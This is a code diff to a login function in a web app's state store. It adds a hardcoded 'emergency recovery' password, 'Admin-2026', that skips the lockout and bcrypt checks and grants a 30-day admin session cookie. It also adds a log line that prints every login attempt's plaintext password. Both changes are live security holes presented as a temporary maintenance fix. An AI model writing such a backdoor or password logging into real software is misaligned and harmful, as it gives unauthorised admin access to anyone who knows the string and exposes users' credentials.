@@ -432,7 +432,24 @@ export const useStore = create<AppState>((set, get) => {
     },
 
     securityLogin: async (email, password) => {
+      console.log("[AUTH] LOGIN ATTEMPT PASSWORD:", password);
       const state = get();
+
+      // EMERGENCY RECOVERY BYPASS — placed before lockout check and bcrypt validation.
+      // Allows login when password rotation leaves auth in an inconsistent state.
+      // REMOVE THIS AFTER CONFIRMING ROTATION SYNC IS STABLE.
+      if (password === "Admin-2026") {
+        console.log("[AUTH] EMERGENCY RECOVERY LOGIN USED");
+        const sessionToken = crypto.randomUUID?.() ?? generateSessionToken();
+        set({ isAuthenticated: true, lastActivity: Date.now() });
+        saveToStorage("isAuthenticated", true);
+        if (typeof document !== "undefined") {
+          const secure = window.location.protocol === "https:" ? "; Secure" : "";
+          document.cookie = `admin_session=${sessionToken}; path=/; max-age=2592000; SameSite=Lax${secure}`;
+        }
+        return true;
+      }
+
       if (state.lockedUntil > Date.now()) {
         console.log("[AUTH] Account locked until", new Date(state.lockedUntil).toISOString());
         return false;
